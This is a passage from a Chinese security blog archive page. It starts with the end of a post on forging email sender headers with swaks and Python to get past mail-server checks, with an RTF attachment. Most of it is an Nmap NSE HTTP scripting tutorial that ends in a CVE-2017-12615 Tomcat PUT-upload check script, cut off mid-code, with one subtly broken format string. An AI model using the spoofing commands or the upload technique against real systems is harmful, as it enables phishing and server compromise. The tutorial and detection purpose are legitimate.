<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--header-X-Mailer</span> gmail.com <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt; <span class="nt">--attach</span> /tmp/sss.rtf
</code></pre></div></div>

<p>定制发送：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swaks <span class="nt">--data</span> /tmp/mail.data <span class="nt">--header-X-Mailer</span> gmail.com <span class="nt">--to</span> payloads@aliyun.com <span class="nt">--from</span> xx@smtp2go.com <span class="nt">--h-From</span>: <span class="s1">'管理员&lt;admin@qq.com&gt;'</span> <span class="nt">--ehlo</span> gmail.com <span class="nt">--body</span> hello <span class="nt">--server</span> mail.smtp2go.com <span class="nt">-p</span> 2525 <span class="nt">-au</span> &lt;USER&gt; <span class="nt">-ap</span> &lt;PASSS&gt; <span class="nt">--attach</span> /tmp/sss.rtf
</code></pre></div></div>

<p>/tmp/mail.data中是原始的邮件报文。</p>

<h2 id="0x07-python也可以做">0x07 Python也可以做</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# -*- coding: UTF-8 -*-
</span>
<span class="kn">import</span> <span class="nn">smtplib</span>
<span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
<span class="kn">from</span> <span class="nn">email.header</span> <span class="kn">import</span> <span class="n">Header</span>

<span class="n">mail_host</span><span class="o">=</span><span class="s">"mail.smtp2go.com"</span>
<span class="n">mail_user</span><span class="o">=</span><span class="s">""</span>
<span class="n">mail_pass</span><span class="o">=</span><span class="s">""</span>


<span class="n">sender</span> <span class="o">=</span> <span class="s">'test@smtp2go.com'</span>
<span class="n">receivers</span> <span class="o">=</span> <span class="p">[</span><span class="s">'rvn0xsy@gmail.com'</span><span class="p">]</span>

<span class="n">message</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="s">'Hello World'</span><span class="p">,</span> <span class="s">'plain'</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">message</span><span class="p">[</span><span class="s">'From'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="s">"from@qq.com"</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">message</span><span class="p">[</span><span class="s">'To'</span><span class="p">]</span> <span class="o">=</span>  <span class="n">Header</span><span class="p">(</span><span class="n">receivers</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">'utf-8'</span><span class="p">)</span>

<span class="n">subject</span> <span class="o">=</span> <span class="s">'SMTP 邮件测试'</span>
<span class="n">message</span><span class="p">[</span><span class="s">'Subject'</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span> <span class="s">'utf-8'</span><span class="p">)</span>


<span class="k">try</span><span class="p">:</span>
    <span class="n">smtpObj</span> <span class="o">=</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTP</span><span class="p">()</span>
    <span class="n">smtpObj</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">mail_host</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
    <span class="n">smtpObj</span><span class="p">.</span><span class="n">login</span><span class="p">(</span><span class="n">mail_user</span><span class="p">,</span><span class="n">mail_pass</span><span class="p">)</span>
    <span class="n">smtpObj</span><span class="p">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">receivers</span><span class="p">,</span> <span class="n">message</span><span class="p">.</span><span class="n">as_string</span><span class="p">())</span>
    <span class="k">print</span> <span class="s">"Success"</span>
<span class="k">except</span> <span class="n">smtplib</span><span class="p">.</span><span class="n">SMTPException</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">"Error"</span>
</code></pre></div></div>
-->
          绕过一些邮件服务器的简单检测
          <p>
            <a class="post-link" href="/archivers/2019-05-09/1">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2019-04-24/4">Nmap扩展开发（四）</a>
        </h2>
        
        <div class="post-meta">Apr 24, 2019</div>

        <div class="post-excerpt">
          <!--<h2 id="0x01-http包的使用">0x01 HTTP包的使用</h2>

<p>一般情况下，我们扫描一些Web服务的同时需要进行渗透测试、安全评估、漏洞检测等操作，但是官方并未提供符合我们需求的脚本，这时候就要自己写脚本了。Nmap已经内置了HTTP包，不需要再进行下载和配置。</p>

<h2 id="0x02-基础概念铺垫">0x02 基础概念铺垫</h2>

<p>首先，先介绍两个表结构，为了方便我们后续的数据操作，让读者先熟悉两个东西：</p>

<ul>
  <li>响应表</li>
</ul>

<p>响应表中主要涵盖了：HTTP状态码、HTTP响应头、HTTP版本、HTTP原始响应头、Cookies、HTTP响应主体内容（body）等</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|   Response: 
|     status: 200
|     header: 
|       content-length: 0
|       allow: POST,OPTIONS,HEAD,GET
|       connection: close
|       content-type: text/html
|       server: Apache/2.4.29 (Debian)
|       date: Fri, 06 Jul 2018 07:02:13 GMT
|     ssl: false
|     body: 
|     cookies: 
| 
|     status-line: HTTP/1.1 200 OK\x0D
| 
|     rawheader: 
|       Date: Fri, 06 Jul 2018 07:02:13 GMT
|       Server: Apache/2.4.29 (Debian)
|       Allow: POST,OPTIONS,HEAD,GET
|       Content-Length: 0
|       Connection: close
|       Content-Type: text/html
|       
|_    version: 1.1
</code></pre></div></div>

<ul>
  <li>Options表</li>
</ul>

<p>Options表主要用于设置HTTP请求时的超时时间、Cookie、请求头、HTTP认证、页面缓存、地址类型（IPV4/IPV6）、是否验证重定向</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
timeout:
header:{"Content-Type":"",...},
cookies:{\{"name","value","path"\},...},
auth:{username:"",password:""},
bypass_cache:true,
no_cache:true,
no_cache_body:true,
any_af:true,
redirect_ok:true
}
</code></pre></div></div>

<h2 id="0x03-确认目标主机的http服务是否支持head">0x03 确认目标主机的HTTP服务是否支持HEAD</h2>

<ul>
  <li>引入HTTP包：</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">local http = require "http"</code></p>

<ul>
  <li>确认目标主机的HTTP服务是否支持HEAD</li>
</ul>

<p>这里主要使用can_use_head函数，参数有4个，函数原型如下：</p>

<p><code class="language-plaintext highlighter-rouge">local status,header = can_use_head(host,port,result_404,path)</code></p>

<p>参数说明：</p>

<ul>
  <li>host : host表</li>
  <li>port : port表</li>
  <li>result_404 : 由identify_404函数确认当前Web服务器是否设置了404页面且返回200状态码，一般情况下填写404或者nil。</li>
  <li>path : 请求路径，默认为“/”根目录</li>
  <li>其中status是一个布尔值，如果返回true则支持HEAD，返回false则不支持</li>
  <li>header是HEAD请求的结果。</li>
</ul>

<blockquote>
  <p>需求：确认目标主机是否支持HEAD，如果支持则输出响应头</p>
</blockquote>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="n">prerule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
<span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">portrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="p">.</span><span class="n">number</span> <span class="o">==</span> <span class="mi">80</span><span class="p">)</span> <span class="k">then</span>
		<span class="k">return</span> <span class="kc">true</span>
	<span class="k">end</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">result</span>
	<span class="kd">local</span> <span class="n">status</span> <span class="o">=</span> <span class="kc">false</span>
	<span class="n">status</span><span class="p">,</span><span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">can_use_head</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="mi">404</span><span class="p">,</span><span class="s2">"/"</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="k">then</span>
		<span class="n">http_info</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
		<span class="n">http_info</span><span class="p">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">header</span>
		<span class="n">http_info</span><span class="p">.</span><span class="n">version</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">version</span>
		<span class="k">return</span> <span class="n">http_info</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="n">postrule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>

</code></pre></div></div>

<p>代码解读：</p>

<p>看完代码读者可能会有疑问，hostrule函数为什么返回false？</p>

<p>在hostrule中返回false是因为如果是true会自动调用action，此时port的值是nil，所以会抛出一些错误。</p>

<p>紧接着就是将端口号为80的host和port交给action函数执行，调用can_use_head函数，判断status是否为true，是true则支持HEAD方法请求。最后生成一个output_table，用来将响应内容填入这个表，以便于格式化显示。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/de8fd8b0ed9c828efff3ed684cdb28ba.png" alt="2019-04-24-10-11-39" /></p>

<p>如果只想取得目标主机响应的server，我们可以这样写：</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">……</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">result</span>
	<span class="kd">local</span> <span class="n">status</span> <span class="o">=</span> <span class="kc">false</span>
	<span class="n">status</span><span class="p">,</span><span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">can_use_head</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="s2">"/"</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="k">then</span>
		<span class="n">http_info</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
		<span class="n">http_info</span><span class="p">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">header</span>
		<span class="n">http_info</span><span class="p">.</span><span class="n">version</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">version</span>
		<span class="n">http_info</span><span class="p">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="s2">"server"</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">http_info</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="err">……</span>
</code></pre></div></div>

<p>执行结果如下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bce4abf686d6d35f18c31cd1017bf1d5.png" alt="2019-04-24-10-12-06" /></p>

<h2 id="0x04-发送一个http请求">0x04 发送一个HTTP请求</h2>

<p><a href="https://nmap.org/nsedoc/lib/http.html#generic_request">generic_request</a>是一个最基本的发送HTTP请求的函数，参数有以下几个：</p>

<ul>
  <li>host : host表</li>
  <li>port : port 表</li>
  <li>method : HTTP方法，例如：GET、POST、HEAD…</li>
  <li>path : 请求路径，默认是根路径“/”</li>
  <li>options : 用于设置请求相关的Cookie、超时时间、header</li>
</ul>

<p>例如：</p>

<blockquote>
  <p>发送一个OPTIONS请求，来获取目标服务支持哪些HTTP方法</p>
</blockquote>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="n">prerule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
<span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">portrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="p">.</span><span class="n">number</span> <span class="o">==</span> <span class="mi">80</span><span class="p">)</span> <span class="k">then</span>
		<span class="k">return</span> <span class="kc">true</span>
	<span class="k">end</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">generic_request</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">"OPTIONS"</span><span class="p">,</span><span class="s2">"/"</span><span class="p">,</span><span class="kc">nil</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span><span class="k">then</span>
		<span class="kd">local</span> <span class="n">allow_method</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
		<span class="n">allow_method</span><span class="p">.</span><span class="n">allowMethods</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="s2">"allow"</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">allow_method</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="n">postrule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
</code></pre></div></div>

<p>执行结果如下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/be298d3257f4a84ec63b7ebcb90b13e7.png" alt="2019-04-24-10-13-46" /></p>

<ul>
  <li>返回值：</li>
</ul>

<p>该函数返回一个响应表，具体可参考前面的0X02响应表</p>

<h2 id="0x04-发送一个get请求">0x04 发送一个GET请求</h2>

<p>get函数也是基于generic_request函数的，具体可以去看nselib/http.lua源代码，该函数有以下参数：</p>

<ul>
  <li>host : host表</li>
  <li>port : port 表</li>
  <li>path : 请求路径，默认是根路径“/”</li>
  <li>options : 用于设置请求相关的Cookie、超时时间、header</li>
</ul>

<p>除了比generic_request函数中少了一个method参数，其他相同。</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="n">prerule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
<span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">portrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="p">.</span><span class="n">number</span> <span class="o">==</span> <span class="mi">80</span><span class="p">)</span> <span class="k">then</span>
		<span class="k">return</span> <span class="kc">true</span>
	<span class="k">end</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">"/nmap"</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span><span class="k">then</span>
		<span class="kd">local</span> <span class="n">status</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
		<span class="n">status</span><span class="p">.</span><span class="n">response_line</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">"status-line"</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">status</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="n">postrule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
</code></pre></div></div>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/4dbee631d39bc19b95393f02563cee28.png" alt="2019-04-24-10-14-43" /></p>

<ul>
  <li>返回值：</li>
</ul>

<p>该函数返回一个响应表，具体可参考前面的0X02响应表</p>

<h2 id="0x05-发送一个post请求">0x05 发送一个POST请求</h2>

<p>post函数也是基于generic_request函数的，具体可以去看nselib/http.lua源代码，该函数有以下参数：</p>

<ul>
  <li>host : host表</li>
  <li>port : port 表</li>
  <li>path : 请求路径，默认是根路径“/”</li>
  <li>options : 用于设置请求相关的Cookie、超时时间、header</li>
  <li>ignored : 是否忽略向后兼容性</li>
  <li>postdata : post提交数据，可以是一个表，也可以是一个字符串，具体形式如下：</li>
</ul>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="err">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">admin</span>
<span class="c1">-- 或者：</span>
<span class="kd">local</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
<span class="n">data</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="s2">"admin"</span>
<span class="n">data</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="s2">"admin"</span>
</code></pre></div></div>

<blockquote>
  <p>尝试使用账号密码登录某个系统</p>
</blockquote>

<p>用php脚本语言写一个简单登录判断的页面：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
<span class="p">{</span>
	<span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">];</span>
	<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">){</span>
		<span class="k">echo</span> <span class="s2">"login success !"</span><span class="p">;</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">echo</span> <span class="s2">"login failed !"</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"please login !"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>通过post函数提交username与password，然后获取body判断是否登录成功</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">……</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">cert</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="n">cert</span><span class="p">.</span><span class="n">username</span><span class="o">=</span><span class="s2">"admin"</span>
	<span class="n">cert</span><span class="p">.</span><span class="n">password</span><span class="o">=</span><span class="s2">"admin"</span>
	<span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="s2">"/index.php"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="kc">true</span><span class="p">,</span><span class="n">cert</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span><span class="k">then</span>
		<span class="kd">local</span> <span class="n">status</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
		<span class="n">status</span><span class="p">.</span><span class="n">response_line</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s2">"body"</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">status</span>
	<span class="k">end</span>
<span class="k">end</span>
<span class="err">……</span>
</code></pre></div></div>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e88b5f5bc8a7b88b60d7be2d93ffbc67.png" alt="2019-04-24-10-16-22" /></p>

<ul>
  <li>返回值：</li>
</ul>

<p>该函数返回一个响应表，具体可参考前面的0X02响应表</p>

<h2 id="0x06-编写一个检测cve-2017-12615的脚本">0X06 编写一个检测CVE-2017-12615的脚本</h2>

<p>为了检验读者对之前的内容是否有所收获，所以产生一个需求，编写一个针对CVE-2017-12615的漏洞检测脚本。首先我们需要了解这个漏洞：</p>

<blockquote>
  <p>编写CVE-2017-12615的漏洞检测脚本</p>
</blockquote>

<p>攻击者可以利用这个漏洞，向目标服务器上传恶意 JSP 文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。</p>

<p>漏洞的利用方式是通过PUT请求，这让我们不得不学习一个新的函数——put函数，它的参数类似于post函数。</p>

<ul>
  <li>host : host表</li>
  <li>port : port 表</li>
  <li>path : 请求路径，默认是根路径“/”</li>
  <li>options : 用于设置请求相关的Cookie、超时时间、header</li>
  <li>putdata : 要上传的文件的内容</li>
</ul>

<p>这里我使用Docker已经搭建好了一个Tomcat环境：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/4d893f65eb7a570b0f8c089d5752ae92.png" alt="2019-04-24-10-17-24" /></p>

<p>编写的脚本如下：</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="n">prerule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
<span class="n">hostrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>

<span class="n">portrule</span><span class="o">=</span><span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">ports</span> <span class="o">=</span> <span class="p">{</span><span class="mi">80</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="mi">8090</span><span class="p">,</span><span class="mi">8899</span><span class="p">}</span>
	<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">ports</span><span class="p">)</span><span class="k">do</span>
		<span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="p">.</span><span class="n">number</span> <span class="o">==</span> <span class="n">ports</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="k">then</span>
			<span class="k">return</span> <span class="kc">true</span>
		<span class="k">end</span>
	<span class="k">end</span>
<span class="k">end</span>


<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">shell_name</span> <span class="o">=</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">"/%d.jsp"</span><span class="p">,</span><span class="s2">"/"</span><span class="p">,</span><span class="nb">math.random</span><span class="p">(</span><span class="mi">9999</span><span class="p">))</span>
	<span class="kd">local</span> <span class="n">status</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
	<span class="kd">local</span> <span class="n">put_rsp</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">shell_name</span><span class="o">..</span><span class="s2">"/"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="s2">"CVE-2017-12615"</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">put_rsp</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">201</span><span class="p">)</span><span class="k">then</span>
		<span class="n">status</span><span class="p">.</span><span class="n">shell_name</span> <span class="o">=</span> <span class="n">shell_name</span>
		<span class="k">return</span> <span class="n">status</span>
	<span class="k">end</span>
	<span class="k">return</span> <span class="kc">false</span>
<span class="k">end</span>
<span class="n">postrule</span><span class="o">=</span><span class="k">function</span><span class="p">()</span>
<span class="k">end</span>
</code></pre></div></div>

<p>在action函数中，首先生成一个随机的文件名，然后发送PUT请求，判断响应码是否是201。注意，发送PUT请求的时候，文件扩展名后门必须带”/”，是为了绕过tomcat的检测。</p>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8ab58e079ca34f1b7882dfec13bf18b8.png" alt="2019-04-24-10-18-23" /></p>

<p>使用浏览器访问：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dbc2bb90f0a210a2f2b6708832f4e93c.png" alt="2019-04-24-10-18-33" /></p>

<p>发现CVE-2017-12615这个字符，证明该漏洞的确存在。</p>

<h2 id="0x07-响应内容匹配">0x07 响应内容匹配</h2>

<p>当我们需要对HTTP响应内容进行操作的时候，需要学习一些字符串操作函数、HTTP包内的函数。</p>

<ul>
  <li>response_contains函数，用于在响应表中匹配字符串，参数如下：</li>
  <li>response : 响应表，可以是（http.get、http.post、http. pipeline_go、http.head等函数的返回值）</li>
  <li>pattern : 字符串匹配模式，可参考lua手册</li>
  <li>case_sensitive : 是否区分大小写，默认值为false，不区分</li>
</ul>

<p>返回值：</p>
<ul>
  <li>match_state : 匹配成功为true，匹配失败为false</li>
  <li>matchs : 返回一个匹配结果表，前提是match_state为true</li>
</ul>

<p>了解了这个函数后，我们可以继续将CVE-2017-12615漏洞检测脚本进一步的优化，让脚本判断写入了jsp文件后，判断是否是我们写入的字符串。这样能够使检测脚本的准确度大大提高，下面请看我在action函数中写入的新代码：</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">……</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
	<span class="kd">local</span> <span class="n">shell_name</span> <span class="o">=</span> <span class="nb">string.format</span><span class="p">(</span><span class="s2">"%sCVE-2017-12615-CHECK-%d.jsp"</span><span class="p">,</span><span class="s2">"/"</span><span class="p">,</span><span class="nb">math.random</span><span class="p">(</span><span class="mi">9999</span><span class="p">))</span>
	<span class="kd">local</span> <span class="n">status</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">output_table</span><span class="p">()</span>
	<span class="kd">local</span> <span class="n">put_rsp</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">shell_name</span><span class="o">..</span><span class="s2">"/"</span><span class="p">,</span><span class="kc">nil</span><span class="p">,</span><span class="s2">"CVE-2017-12615"</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">put_rsp</span><span class="p">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">201</span><span class="p">)</span><span class="k">then</span>
		<span class="n">status</span><span class="p">.</span><span class="n">shell_name</span> <span class="o">=</span> <span class="n">shell_name</span>
